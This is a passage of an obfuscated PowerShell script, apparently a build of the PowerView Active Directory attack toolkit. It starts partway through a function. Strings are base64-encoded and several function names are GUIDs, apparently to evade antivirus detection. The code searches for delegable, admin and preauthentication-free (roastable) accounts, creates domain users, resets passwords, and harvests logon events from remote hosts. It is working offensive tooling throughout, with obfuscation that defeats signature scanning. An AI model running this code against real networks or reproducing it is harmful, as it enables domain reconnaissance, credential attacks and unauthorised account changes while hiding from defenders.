                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIAB1AHMAZQByAHMAIAB3AGgAbwAgAGMAYQBuACAAYgBlACAAZABlAGwAZQBnAGEAdABlAGQA')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAxADAANAA4ADUANwA0ACkAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBsAGwAbwB3AEQAZQBsAGUAZwBhAHQAaQBvAG4A')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIAB1AHMAZQByAHMAIAB3AGgAbwAgAGEAcgBlACAAcwBlAG4AcwBpAHQAaQB2AGUAIABhAG4AZAAgAG4AbwB0ACAAdAByAHUAcwB0AGUAZAAgAGYAbwByACAAZABlAGwAZQBnAGEAdABpAG8AbgA=')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADEAMAA0ADgANQA3ADQAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIABhAGQAbQBpAG4AQwBvAHUAbgB0AD0AMQA=')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABhAGQAbQBpAG4AYwBvAHUAbgB0AD0AMQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZABUAG8AQQB1AHQAaAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIAB1AHMAZQByAHMAIAB0AGgAYQB0ACAAYQByAGUAIAB0AHIAdQBzAHQAZQBkACAAdABvACAAYQB1AHQAaABlAG4AdABpAGMAYQB0AGUAIABmAG8AcgAgAG8AdABoAGUAcgAgAHAAcgBpAG4AYwBpAHAAYQBsAHMA')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABtAHMAZABzAC0AYQBsAGwAbwB3AGUAZAB0AG8AZABlAGwAZQBnAGEAdABlAHQAbwA9ACoAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGUAYQB1AHQAaABOAG8AdABSAGUAcQB1AGkAcgBlAGQA')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIAB1AHMAZQByACAAYQBjAGMAbwB1AG4AdABzACAAdABoAGEAdAAgAGQAbwAgAG4AbwB0ACAAcgBlAHEAdQBpAHIAZQAgAGsAZQByAGIAZQByAG8AcwAgAHAAcgBlAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlAA==')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADQAMQA5ADQAMwAwADQAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFUAcwBpAG4AZwAgAGEAZABkAGkAdABpAG8AbgBhAGwAIABMAEQAQQBQACAAZgBpAGwAdABlAHIAOgAgACQATABEAEEAUABGAGkAbAB0AGUAcgA=')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAuACoA')))) {
                    ${834edd590d404d47a0f82b91e88597ca} = $_.Substring(4)
                    ${f2105d7958054e66951a27fa8dd3e8bb} = [Int](${ad9be41dbd0943c2b70046d95a560c23}::${834edd590d404d47a0f82b91e88597ca})
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAkAHsAZgAyADEAMAA1AGQANwA5ADUAOAAwADUANABlADYANgA5ADUAMQBhADIANwBmAGEAOABkAGQAMwBlADgAYgBiAH0AKQApAA==')))
                }
                else {
                    ${f2105d7958054e66951a27fa8dd3e8bb} = [Int](${ad9be41dbd0943c2b70046d95a560c23}::$_)
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ACQAewBmADIAMQAwADUAZAA3ADkANQA4ADAANQA0AGUANgA2ADkANQAxAGEAMgA3AGYAYQA4AGQAZAAzAGUAOABiAGIAfQApAA==')))
                }
            }
            ${8b6b7223663c46408c1ab55f22106dd6}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADgAKQAkAEYAaQBsAHQAZQByACkA')))
            Write-Verbose "[Get-DomainUser] filter string: $(${8b6b7223663c46408c1ab55f22106dd6}.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${c1d2f3b775df48dfbe092797965c6f30} = ${8b6b7223663c46408c1ab55f22106dd6}.FindOne() }
            else { ${c1d2f3b775df48dfbe092797965c6f30} = ${8b6b7223663c46408c1ab55f22106dd6}.FindAll() }
            ${c1d2f3b775df48dfbe092797965c6f30} | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    ${a8824b20a55c40d29e08c2f892a05f8e} = $_
                    ${a8824b20a55c40d29e08c2f892a05f8e}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAC4AUgBhAHcA'))))
                }
                else {
                    ${a8824b20a55c40d29e08c2f892a05f8e} = ac8c47b8977f4b0f9b4bbd3cb21b1a28 -Properties $_.Properties
                    ${a8824b20a55c40d29e08c2f892a05f8e}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAA=='))))
                }
                ${a8824b20a55c40d29e08c2f892a05f8e}
            }
            if (${c1d2f3b775df48dfbe092797965c6f30}) {
                try { ${c1d2f3b775df48dfbe092797965c6f30}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEUAcgByAG8AcgAgAGQAaQBzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzACAAbwBiAGoAZQBjAHQAOgAgACQAXwA=')))
                }
            }
            ${8b6b7223663c46408c1ab55f22106dd6}.dispose()
        }
    }
}
function New-DomainUser {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $AccountPassword,
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,
        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Description,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    ${a13aaf2c161345c48ea81638d22fe192} = @{
        'Identity' = $SamAccountName
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${a13aaf2c161345c48ea81638d22fe192}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${a13aaf2c161345c48ea81638d22fe192}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    ${084af00cb6d64d1b8aedda7cb962e03c} = a1fcecd3120940898e2774ec72768c1d @a13aaf2c161345c48ea81638d22fe192
    if (${084af00cb6d64d1b8aedda7cb962e03c}) {
        ${a8824b20a55c40d29e08c2f892a05f8e} = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList (${084af00cb6d64d1b8aedda7cb962e03c}.Context)
        ${a8824b20a55c40d29e08c2f892a05f8e}.SamAccountName = ${084af00cb6d64d1b8aedda7cb962e03c}.Identity
        ${adfa4ed0602e46ae986170ca4c90bff4} = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
        ${a8824b20a55c40d29e08c2f892a05f8e}.SetPassword(${adfa4ed0602e46ae986170ca4c90bff4}.GetNetworkCredential().Password)
        ${a8824b20a55c40d29e08c2f892a05f8e}.Enabled = $True
        ${a8824b20a55c40d29e08c2f892a05f8e}.PasswordNotRequired = $False
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))]) {
            ${a8824b20a55c40d29e08c2f892a05f8e}.Name = $Name
        }
        else {
            ${a8824b20a55c40d29e08c2f892a05f8e}.Name = ${084af00cb6d64d1b8aedda7cb962e03c}.Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAcABsAGEAeQBOAGEAbQBlAA==')))]) {
            ${a8824b20a55c40d29e08c2f892a05f8e}.DisplayName = $DisplayName
        }
        else {
            ${a8824b20a55c40d29e08c2f892a05f8e}.DisplayName = ${084af00cb6d64d1b8aedda7cb962e03c}.Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA==')))]) {
            ${a8824b20a55c40d29e08c2f892a05f8e}.Description = $Description
        }
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEEAdAB0AGUAbQBwAHQAaQBuAGcAIAB0AG8AIABjAHIAZQBhAHQAZQAgAHUAcwBlAHIAIAAnACQAUwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlACcA')))
        try {
            $Null = ${a8824b20a55c40d29e08c2f892a05f8e}.Save()
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFUAcwBlAHIAIAAnACQAUwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlACcAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGMAcgBlAGEAdABlAGQA')))
            ${a8824b20a55c40d29e08c2f892a05f8e}
        }
        catch {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEUAcgByAG8AcgAgAGMAcgBlAGEAdABpAG4AZwAgAHUAcwBlAHIAIAAnACQAUwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlACcAIAA6ACAAJABfAA==')))
        }
    }
}
function Set-DomainUserPassword {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        $Identity,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $AccountPassword,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    ${a13aaf2c161345c48ea81638d22fe192} = @{ 'Identity' = $Identity }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${a13aaf2c161345c48ea81638d22fe192}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${a13aaf2c161345c48ea81638d22fe192}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    ${084af00cb6d64d1b8aedda7cb962e03c} = a1fcecd3120940898e2774ec72768c1d @a13aaf2c161345c48ea81638d22fe192
    if (${084af00cb6d64d1b8aedda7cb962e03c}) {
        ${a8824b20a55c40d29e08c2f892a05f8e} = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity(${084af00cb6d64d1b8aedda7cb962e03c}.Context, $Identity)
        if (${a8824b20a55c40d29e08c2f892a05f8e}) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAUABhAHMAcwB3AG8AcgBkAF0AIABBAHQAdABlAG0AcAB0AGkAbgBnACAAdABvACAAcwBlAHQAIAB0AGgAZQAgAHAAYQBzAHMAdwBvAHIAZAAgAGYAbwByACAAdQBzAGUAcgAgACcAJABJAGQAZQBuAHQAaQB0AHkAJwA=')))
            try {
                ${adfa4ed0602e46ae986170ca4c90bff4} = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
                ${a8824b20a55c40d29e08c2f892a05f8e}.SetPassword(${adfa4ed0602e46ae986170ca4c90bff4}.GetNetworkCredential().Password)
                $Null = ${a8824b20a55c40d29e08c2f892a05f8e}.Save()
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAUABhAHMAcwB3AG8AcgBkAF0AIABQAGEAcwBzAHcAbwByAGQAIABmAG8AcgAgAHUAcwBlAHIAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAHIAZQBzAGUAdAA=')))
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAUABhAHMAcwB3AG8AcgBkAF0AIABFAHIAcgBvAHIAIABzAGUAdAB0AGkAbgBnACAAcABhAHMAcwB3AG8AcgBkACAAZgBvAHIAIAB1AHMAZQByACAAJwAkAEkAZABlAG4AdABpAHQAeQAnACAAOgAgACQAXwA=')))
            }
        }
        else {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAUABhAHMAcwB3AG8AcgBkAF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAGYAaQBuAGQAIAB1AHMAZQByACAAJwAkAEkAZABlAG4AdABpAHQAeQAnAA==')))
        }
    }
}
function a5ac435dfb2d4f2f949ec249cd4857fa {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4} = ${Env:ac645935110b4eaea96e7bf6f0b2d7f4},
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${ef288d403331462bbd4c88173b2e07a9} = [DateTime]::Now.AddDays(-1),
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${dfe397cdf0b74d6d8984c08a995717ad} = [DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${dc8eaefaec8a4f548a2df1a298c7d5ac} = @"
<QueryList>
    <Query Id="0" Path="Security">

        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$(${ef288d403331462bbd4c88173b2e07a9}.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$(${dfe397cdf0b74d6d8984c08a995717ad}.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>

        <!-- Logon with explicit credential events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$(${ef288d403331462bbd4c88173b2e07a9}.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$(${dfe397cdf0b74d6d8984c08a995717ad}.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>

        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        ${c100b8fa8b3c436f8fe6c1122e9560ee} = @{
            'FilterXPath' = ${dc8eaefaec8a4f548a2df1a298c7d5ac}
            'LogName' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AA==')))
            'MaxEvents' = $MaxEvents
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${c100b8fa8b3c436f8fe6c1122e9560ee}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        ForEach (${a9e149a622e146cb8c4c690f286bb4b0} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
            ${c100b8fa8b3c436f8fe6c1122e9560ee}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))] = ${a9e149a622e146cb8c4c690f286bb4b0}
            Get-WinEvent @c100b8fa8b3c436f8fe6c1122e9560ee| ForEach-Object {
                ${68a7755973454f34aef1be24b0a62a88} = $_
                $Properties = ${68a7755973454f34aef1be24b0a62a88}.Properties
                Switch (${68a7755973454f34aef1be24b0a62a88}.Id) {
                    4624 {
                        if(-not $Properties[5].Value.EndsWith('$')) {
                            ${b01c344f140447efaf17619a650a69ed} = New-Object PSObject -Property @{
                                ComputerName              = ${a9e149a622e146cb8c4c690f286bb4b0}
                                TimeCreated               = ${68a7755973454f34aef1be24b0a62a88}.TimeCreated
                                EventId                   = ${68a7755973454f34aef1be24b0a62a88}.Id
                                SubjectUserSid            = $Properties[0].Value.ToString()
                                SubjectUserName           = $Properties[1].Value
                                SubjectDomainName         = $Properties[2].Value
                                SubjectLogonId            = $Properties[3].Value
                                TargetUserSid             = $Properties[4].Value.ToString()
                                TargetUserName            = $Properties[5].Value
                                TargetDomainName          = $Properties[6].Value
                                TargetLogonId             = $Properties[7].Value
                                LogonType                 = $Properties[8].Value
                                LogonProcessName          = $Properties[9].Value
                                AuthenticationPackageName = $Properties[10].Value
                                WorkstationName           = $Properties[11].Value
                                LogonGuid                 = $Properties[12].Value
                                TransmittedServices       = $Properties[13].Value
                                LmPackageName             = $Properties[14].Value
                                KeyLength                 = $Properties[15].Value
                                ProcessId                 = $Properties[16].Value
                                ProcessName               = $Properties[17].Value
                                IpAddress                 = $Properties[18].Value
                                IpPort                    = $Properties[19].Value
                                ImpersonationLevel        = $Properties[20].Value
                                RestrictedAdminMode       = $Properties[21].Value
                                TargetOutboundUserName    = $Properties[22].Value
                                TargetOutboundDomainName  = $Properties[23].Value
                                VirtualAccount            = $Properties[24].Value
                                TargetLinkedLogonId       = $Properties[25].Value
                                ElevatedToken             = $Properties[26].Value
                            }
                            ${b01c344f140447efaf17619a650a69ed}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AZwBvAG4ARQB2AGUAbgB0AA=='))))
                            ${b01c344f140447efaf17619a650a69ed}
                        }
                    }
                    4648 {
                        if((-not $Properties[5].Value.EndsWith('$')) -and ($Properties[11].Value -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABhAHMAawBoAG8AcwB0AFwALgBlAHgAZQA='))))) {
                            ${b01c344f140447efaf17619a650a69ed} = New-Object PSObject -Property @{
                                ComputerName              = ${a9e149a622e146cb8c4c690f286bb4b0}
                                TimeCreated       = ${68a7755973454f34aef1be24b0a62a88}.TimeCreated
                                EventId           = ${68a7755973454f34aef1be24b0a62a88}.Id
                                SubjectUserSid    = $Properties[0].Value.ToString()
                                SubjectUserName   = $Properties[1].Value
                                SubjectDomainName = $Properties[2].Value
                                SubjectLogonId    = $Properties[3].Value
                                LogonGuid         = $Properties[4].Value.ToString()
                                TargetUserName    = $Properties[5].Value
                                TargetDomainName  = $Properties[6].Value
                                TargetLogonGuid   = $Properties[7].Value
                                TargetServerName  = $Properties[8].Value
                                TargetInfo        = $Properties[9].Value
                                ProcessId         = $Properties[10].Value
                                ProcessName       = $Properties[11].Value
                                IpAddress         = $Properties[12].Value
                                IpPort            = $Properties[13].Value
                            }
                            ${b01c344f140447efaf17619a650a69ed}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBFAHgAcABsAGkAYwBpAHQAQwByAGUAZABlAG4AdABpAGEAbABMAG8AZwBvAG4ARQB2AGUAbgB0AA=='))))
                            ${b01c344f140447efaf17619a650a69ed}
                        }
                    }
                    default {
                        Write-Warning "No handler exists for event ID: $(${68a7755973454f34aef1be24b0a62a88}.Id)"
                    }
                }
            }
        }
    }
}
function deb7531da8424a2990dabc7592791ba6 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    ${4ec6a424a697407eb189b374cdcb24a9} = @{'00000000-0000-0000-0000-000000000000' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA')))}
    ${263a6cfbc0f942a88f33b54c403c0b0f} = @{}
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${263a6cfbc0f942a88f33b54c403c0b0f}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    try {
        ${984cc0865e5942c69831cd16ed70dbc1} = (a1f50b6c1bc641b48c8648605758f288 @263a6cfbc0f942a88f33b54c403c0b0f).schema.name
    }
    catch {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGkAbgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIABmAG8AcgBlAHMAdAAgAHMAYwBoAGUAbQBhACAAcABhAHQAaAAgAGYAcgBvAG0AIABHAGUAdAAtAEYAbwByAGUAcwB0AA==')))
    }
    if (-not ${984cc0865e5942c69831cd16ed70dbc1}) {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGkAbgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIABmAG8AcgBlAHMAdAAgAHMAYwBoAGUAbQBhACAAcABhAHQAaAAgAGYAcgBvAG0AIABHAGUAdAAtAEYAbwByAGUAcwB0AA==')))
    }
    ${afd7d337a750465cb1eadfa1f8ae176d} = @{
        'SearchBase' = ${984cc0865e5942c69831cd16ed70dbc1}
        'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGMAaABlAG0AYQBJAEQARwBVAEkARAA9ACoAKQA=')))
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
